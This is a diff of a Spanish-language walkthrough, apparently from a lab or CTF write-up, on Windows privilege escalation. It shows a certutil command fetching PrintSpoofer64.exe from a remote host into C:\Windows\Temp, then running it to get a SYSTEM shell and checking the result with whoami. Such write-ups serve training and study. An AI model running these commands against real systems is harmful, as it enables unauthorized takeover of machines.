@@ -40,6 +40,24 @@ Descargamos el archivo con el siguiente comando:
 certutil -urlcache -split -f http://192.168.176.220:8080/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
 
 ```
+
 ## ¿Por qué enviar el archivo a `Temp`?
 
 Utilizamos `C:\Windows\Temp` porque es un directorio destinado al almacenamiento temporal de archivos y, normalmente, permite la escritura por usuarios y procesos con permisos limitados. Esto facilita transferir y ejecutar herramientas durante la explotación sin modificar directamente directorios críticos del sistema.
+
+## Ejecución de printspoofer y escalación de privilegios 
+
+```
+C:\Windows\Temp\ps.exe -i -c cmd.exe
+```
+
+Verificación de escalada:
+
+```cmd
+whoami
+# nt authority\system
+```
+
+
+
+
